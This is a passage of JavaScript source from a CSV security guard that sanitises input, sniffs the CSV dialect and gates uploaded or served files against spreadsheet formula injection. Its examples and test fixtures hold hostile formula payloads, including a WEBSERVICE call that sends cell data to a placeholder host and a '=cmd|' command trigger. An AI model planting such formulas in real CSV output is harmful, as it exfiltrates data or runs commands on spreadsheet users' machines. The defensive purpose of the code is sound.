 * @signature  b.guardCsv.sanitize(input, opts?)
 * @since      0.7.5
 * @status     stable
 * @related    b.guardCsv.validate, b.guardCsv.gate
 *
 * Best-effort cleanup of `input` (string or Buffer): strips leading
 * BOM (when `bomPrefix: false`), bidi override chars (when
 * `bidiCharPolicy: "strip"`), C0 control chars (when
 * `controlCharPolicy: "strip"`), null bytes (when
 * `nullByteHandling: "strip"`), zero-width and Unicode Tags chars
 * (always), and trailing whitespace per `trailingWhitespacePolicy`.
 *
 * Throws when a character class is set to `"reject"` and the input
 * carries it — `"reject"` refuses, `"strip"` repairs, and sanitize
 * never returns a class the operator asked it to refuse. Refuses
 * pathological expansion: when the sanitized output exceeds
 * `sanitizeAmplificationCap` (default 1.5x) the function throws
 * `GuardCsvError("csv/sanitize-amplified")` — sanitize is a
 * shrinking operation by contract, never a growing one.
 *
 * Note: sanitize does NOT prepend formula-trigger mitigations to
 * cells (that's `b.guardCsv.serialize` / `b.guardCsv.escapeCell`'s
 * job, applied during emission). Use the `gate` action chain for
 * accept-side defense — it sanitizes, re-parses, and re-serializes
 * with the formula mitigation baked in.
 *
 * @opts
 *   profile:    "strict"|"balanced"|"permissive"|"email-attachment",
 *   compliancePosture: "hipaa"|"pci-dss"|"gdpr"|"soc2",
 *   bidiCharPolicy:    "reject"|"strip"|"audit"|"allow",
 *   controlCharPolicy: "reject"|"strip"|"allow",
 *   nullByteHandling:  "reject"|"strip"|"allow",
 *   homoglyphPolicy:   "audit"|"strip"|"allow",
 *   trailingWhitespacePolicy: "trim"|"preserve"|"reject",
 *   sanitizeAmplificationCap: number,   // default 1.5
 *
 * @example
 *   // Build hostile input programmatically so the source stays ASCII.
 *   var ZWSP = String.fromCharCode(0x200B);
 *   var clean = b.guardCsv.sanitize("name,note\r\nalice,hi" + ZWSP + "\r\n", {
 *     profile: "balanced",
 *   });
 *   clean.indexOf(ZWSP) === -1;                        // → true
 */

/**
 * @primitive  b.guardCsv.detect
 * @signature  b.guardCsv.detect(input)
 * @since      0.7.5
 * @status     stable
 * @related    b.guardCsv.validate, b.csv.parse
 *
 * Sniff dialect heuristics from `input` (string or Buffer): most-
 * frequent delimiter on the first line (`","`, `";"`, `"\t"`,
 * `"|"`), dominant line-ending, header presence (first line starts
 * with an ASCII letter), encoding hint (`"utf-8"` vs `"utf-8-sig"`
 * when a leading BOM is present), and a single-pass `dialect`
 * verdict (`"consistent"` vs `"mixed"` line endings). Returns a
 * confidence score in `[0, 1]`. Pure inspection.
 *
 * @example
 *   var d = b.guardCsv.detect("name,age\r\nalice,30\r\nbob,40\r\n");
 *   d.delimiter;                                       // → ","
 *   d.lineEnding;                                      // → "\r\n"
 *   d.hasHeader;                                       // → true
 *   d.encoding;                                        // → "utf-8"
 *   d.dialect;                                         // → "consistent"
 */
function detect(input) {
  var text = typeof input === "string"
    ? input
    : (Buffer.isBuffer(input) ? input.toString("utf8") : null);
  if (text == null) {
    return {
      delimiter: null, hasHeader: false, encoding: null,
      lineEnding: null, dialect: "unknown", confidence: 0,
    };
  }
  var endings = _lineEndingCounts(text);
  var crlf = endings.crlf, lfOnly = endings.lf, crOnly = endings.cr;
  var lineEnding = crlf >= lfOnly && crlf >= crOnly
    ? "\r\n"
    : (lfOnly >= crOnly ? "\n" : "\r");
  var firstLine = _firstLine(text);
  var counts = { ",": 0, ";": 0, "\t": 0, "|": 0 };
  for (var i = 0; i < firstLine.length; i += 1) {
    var c = firstLine.charAt(i);
    if (counts[c] !== undefined) counts[c] += 1;
  }
  var delim = ","; var max = 0;
  Object.keys(counts).forEach(function (k) {
    if (counts[k] > max) { max = counts[k]; delim = k; }
  });
  return {
    delimiter:  delim,
    hasHeader:  _startsWithAsciiLetter(firstLine),
    encoding:   text.charCodeAt(0) === 0xFEFF ? "utf-8-sig" : "utf-8",
    lineEnding: lineEnding,
    dialect:    (crlf > 0 && (lfOnly > 0 || crOnly > 0)) ? "mixed" : "consistent",
    confidence: max > 0 ? 0.9 : 0.5,
  };
}

/**
 * @primitive  b.guardCsv.gate
 * @signature  b.guardCsv.gate(opts?)
 * @since      0.7.5
 * @status     stable
 * @compliance hipaa, pci-dss, gdpr, soc2
 * @related    b.guardCsv.validate, b.guardCsv.sanitize, b.staticServe.create, b.fileUpload.create
 *
 * Build a `b.gateContract` gate suitable for plugging into
 * `b.staticServe({ contentSafety: { ".csv": gate } })`,
 * `b.fileUpload({ contentSafety: { "text/csv": gate } })`,
 * `b.mail`, or `b.objectStore`. Each finding's action is the one the
 * operator's policy for that class selected: `serve` (no issues) →
 * `audit-only` (observe-only findings) → `sanitize` (a class set to a
 * mitigation — formula `prefix-tab`, bidi/control `strip` — so the gate
 * strips, then re-parses + re-serializes when a formula cell is present so
 * escapeCell's mitigation lands) → `refuse` (a class set to `reject`, the
 * dangerous-function denylist, or an ambiguous mixed dialect). `refuse`
 * wins over `sanitize` wins over `audit-only`.
 *
 * Operator extensibility: pass `operatorRules: [{ id, severity,
 * detect: fn(ctx)→boolean, reason }]` to inject custom detectors
 * alongside the built-in catalog. Rules run best-effort — a
 * throwing detector is silently skipped (the framework cannot
 * crash a request because an operator rule mishandled bytes).
 *
 * @opts
 *   profile:    "strict"|"balanced"|"permissive"|"email-attachment",
 *   compliancePosture: "hipaa"|"pci-dss"|"gdpr"|"soc2",
 *   name:       string,    // gate identity for audit / observability
 *   operatorRules: [{ id: string, severity: "warn"|"high"|"critical",
 *                    detect: function, reason: string }],
 *
 * @example
 *   var csvGate = b.guardCsv.gate({ profile: "strict" });
 *
 *   // Wire into staticServe so every served .csv runs through the gate.
 *   var serve = b.staticServe.create({
 *     root: "/var/data",
 *     contentSafety: { ".csv": csvGate },
 *   });
 *
 *   // A plain formula cell is mitigated in place (strict's formula policy is
 *   // prefix-tab — a cell beginning `=`/`+`/`-`/`@` is prefixed with a TAB so
 *   // spreadsheets render it as text rather than evaluate it):
 *   var formula = Buffer.from("name,formula\r\nalice,=cmd|x\r\n", "utf8");
 *   (await csvGate.check({ bytes: formula })).action;  // → "sanitize"
 *
 *   // A denylisted exfiltration/RCE function refuses — too dangerous to serve
 *   // even prefixed:
 *   var exfil = Buffer.from('a\r\n=WEBSERVICE("http://x/"&A1)\r\n', "utf8");
 *   (await csvGate.check({ bytes: exfil })).action;    // → "refuse"
 */
function _gateDispositionFor(issue, opts) {
  switch (issue.kind) {
    case "bidi-override":              return gateContract.policyDisposition(opts.bidiCharPolicy);
    case "control-char":               return gateContract.policyDisposition(opts.controlCharPolicy);
    case "null-byte":                  return gateContract.policyDisposition(opts.nullByteHandling);
    case "formula-prefix-cell":        return gateContract.policyDisposition(opts.formulaInjectionPolicy);
    case "homoglyph":                  return gateContract.policyDisposition(opts.homoglyphPolicy);
    case "bom-mid-stream":             return "sanitize";
    case "zero-width":                 return "sanitize";
    case "unicode-tags":               return "sanitize";
    case "dangerous-function":         return "refuse";
    case "dialect-mixed-line-endings": return "refuse";
    default:                           return null;
  }
}

function _gateOperatorIssues(text, opts, ctx) {
  var out = [];
  if (!Array.isArray(opts.operatorRules)) return out;
  for (var i = 0; i < opts.operatorRules.length; i += 1) {
    var rule = opts.operatorRules[i];
    try {
      if (rule.detect && rule.detect({ bytes: text, ctx: ctx })) {
        out.push({
          kind: rule.id, severity: rule.severity || "high",
          ruleId: rule.id, snippet: rule.reason || rule.id,
        });
      }
    } catch (_e) { /* operator rule best-effort */ }
  }
  return out;
}

function _gateProduceSanitized(text, opts) {
  var clean = module.exports.sanitize(text, opts);
  var hasFormula = _detectIssues(clean, opts).some(function (i) {
    return i.kind === "formula-prefix-cell" || i.kind === "dangerous-function";
  });
  if (hasFormula) {
    var rows = csv.parse(clean, {
      header:    false,
      delimiter: opts.delimiter,
      quote:     opts.quote || "\"",
    });
    clean = serialize(rows, Object.assign({}, opts, { headers: false }));
  }

  var residual = null;
  var formulasPermitted = opts.formulaInjectionPolicy === "allow" ||
                          opts.formulaInjectionPolicy === "audit-only";
  if (!formulasPermitted) _eachCellStart(clean, opts.quote || "\"",
    _cellDelimiters(opts.delimiter),
    function (at) {
      var quoted = clean.charAt(at) === (opts.quote || "\"");
      var triggerAt = quoted ? at + 1 : at;
      var ch = clean.charAt(triggerAt);
      if (ch === "" || FORMULA_PREFIXES.indexOf(ch) === -1) return false;
      if (!quoted && _isLineTerminator(ch)) return false;
      if (quoted && ch === "\t" && opts.formulaInjectionPolicy === "prefix-tab") return false;
      if (opts.formulaInjectionPolicy === "allowlist") {
        var name = _leadingFunctionName(clean.slice(triggerAt));
        if (name !== null && opts.formulasAllowlist.some(function (fn) {
          return String(fn).toUpperCase() === name.toUpperCase();
        })) return false;
      }
      residual = { index: triggerAt, char: ch };
      return true;
    });
  if (residual === null) {
    var dangerous = _detectIssues(clean, opts).filter(function (i) {
      return i.kind === "dangerous-function";
    });
    if (dangerous.length > 0) residual = { snippet: dangerous[0].snippet };
  }
  if (residual !== null) {
    throw _err("csv.formula-injection",
      "sanitize cannot disarm " +
      JSON.stringify(residual.snippet ||
        ("cell beginning with " + JSON.stringify(residual.char) +
         " at offset " + residual.index)) +
      " without rewriting the document for a dialect it is not emitting");
  }
  return Buffer.from(clean, "utf8");
}

function gate(opts) {
  opts = module.exports.resolveOpts(opts);
  return gateContract.buildContentGate({
    name:             opts.name || "guardCsv:" + (opts.profile || "default"),
    opts:             opts,
    validate:         module.exports.validate,
    dispositionFor:   _gateDispositionFor,
    extraIssues:      _gateOperatorIssues,
    produceSanitized: _gateProduceSanitized,
  });
}

var INTEGRATION_FIXTURES = Object.freeze({
  kind:        "content",
  contentType: "text/csv",
  extension:   ".csv",
  benignBytes: Buffer.from("name,age\r\nalice,30\r\n", "utf8"),
  hostileBytes: Buffer.from('name,formula\r\nalice,=WEBSERVICE("http://x/"&A1)\r\n', "utf8"),
});

var POLICY_ENUM = Object.freeze({
  formulaInjectionPolicy:   ["prefix-tab", "prefix-quote", "wrap-with-quotes-and-prefix",
                             "reject", "allowlist", "audit-only", "allow"],
  bidiCharPolicy:           ["reject", "strip", "audit", "allow"],
  controlCharPolicy:        ["reject", "strip", "allow"],
  homoglyphPolicy:          ["audit", "strip", "allow"],
  trailingWhitespacePolicy: ["trim", "preserve", "reject"],
  dialectPolicy:            ["strict", "permissive"],
  numericPrecisionPolicy:   ["decimal-string-above-safe-int", "scientific", "reject-bigint"],
  piiPolicy:                ["preserve", "redact"],
});

module.exports = gateContract.defineGuard({
  enumOpts:    POLICY_ENUM,
  name:        "csv",
  kind:        "content",
  errorClass:  GuardCsvError,
  profiles:    PROFILES,
  defaults:    DEFAULTS,
  postures:    COMPLIANCE_POSTURES,
  mimeTypes:   ["text/csv"],
  extensions:  [".csv"],
  integrationFixtures: INTEGRATION_FIXTURES,
  inputContract:            "text",
  detect:                   _detectIssues,
  sanitizeTransform:        _stripIssues,
  sanitizeSeverities:       [],
  sanitizeAmplificationCap: "sanitizeAmplificationCap",
  intOpts:     ["maxRows", "maxColumns", "maxCellBytes", "maxTotalBytes"],
  gate:        gate,
  extra: {
    _gateDispositionForTest: _gateDispositionFor,
    serialize:           serialize,
    escapeCell:          escapeCell,
    detect:              detect,
    schema:              schema,
    FORMULA_PREFIXES:    FORMULA_PREFIXES,
    DANGEROUS_FUNCTIONS: DANGEROUS_FUNCTIONS,
  },
});
